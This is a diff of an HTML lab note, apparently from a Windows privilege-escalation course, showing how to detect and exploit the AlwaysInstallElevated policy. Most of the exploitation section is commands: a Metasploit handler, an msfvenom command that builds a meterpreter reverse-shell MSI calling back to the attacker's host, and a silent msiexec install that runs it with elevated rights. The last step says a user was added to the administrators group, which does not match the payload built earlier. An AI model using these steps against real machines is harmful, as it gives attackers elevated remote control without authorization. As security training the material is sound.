@@ -3,29 +3,38 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Overeview (AlwaysInstallElevated)</title>
-</head><body><span style="font-size: 15pt"><b>Detection</b><br/>
-<br/>
+</head><body><b><div style="text-align: center"><span style="font-size: 20pt"><span style="color: #ffa300">Detection</span></span></div></b><br/>
+<span style="font-size: 15pt"><br/>
 <b>Windows VM</b><br/>
 <br/>
-1.Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer<br/>
-2.From the output, notice that “AlwaysInstallElevated” value is 1.<br/>
-3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer<br/>
-4.From the output, notice that “AlwaysInstallElevated” value is 1.<br/>
+1.Open command prompt and type:<br/>
+<b>reg query HKLM\Software\Policies\Microsoft\Windows\Installer</b><br/>
+2.From the output, notice that <b>“AlwaysInstallElevated”</b>&nbsp;value is <b>1</b>.<br/>
+3.In command prompt type:<br/>
+<b>reg query HKCU\Software\Policies\Microsoft\Windows\Installer</b><br/>
+4.From the output, notice that <b>“AlwaysInstallElevated”</b>&nbsp;value is <b>1</b>.<br/>
 <br/>
-<b>Exploitation</b><br/>
-<b><br/>
-</b><b>Kali VM</b><br/>
+<br/>
+<br/>
+</span><b><span style="color: #ff0000"><span style="font-size: 20pt"><div style="text-align: center">Exploitation</div></span></span><br/>
+<span style="font-size: 15pt"><br/>
+</span></b><span style="font-size: 15pt"><b>Kali VM</b><br/>
 <br/>
 1. Open command prompt and type: msfconsole<br/>
-2. In Metasploit (msf &gt; prompt) type: use multi/handler<br/>
-3. In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp<br/>
-4. In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]<br/>
-5. In Metasploit (msf &gt; prompt) type: run<br/>
-6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi<br/>
+2. In Metasploit <b>(msf &gt; prompt): use multi/handler</b><br/>
+3. In Metasploit <b>(msf &gt; prompt): set payload windows/meterpreter/reverse_tcp</b><br/>
+4. In Metasploit <b>(msf &gt; prompt): set lhost <i>[Kali VM IP Address]</i></b><br/>
+5. In Metasploit <b>(msf &gt; prompt): run</b><br/>
+6. Open an additional command prompt and type:<br/>
+<b>msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi</b><br/>
 7. Copy the generated file, setup.msi, to the Windows VM.<br/>
+<br/>
+<br/>
 <br/>
 <b>Windows VM</b><br/>
 <br/>
-1.Place ‘setup.msi’ in ‘C:\Temp’.<br/>
-2.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi<br/>
-3.It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</span></body></html>
+1.Place <b>‘setup.msi’</b>&nbsp;in <b>‘C:\Temp’.</b><br/>
+2.Open command prompt and type:<br/>
+<b>msiexec /quiet /qn /i C:\Temp\setup.msi</b><br/>
+3.It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt:<br/>
+<b>net localgroup administrators</b></span></body></html>
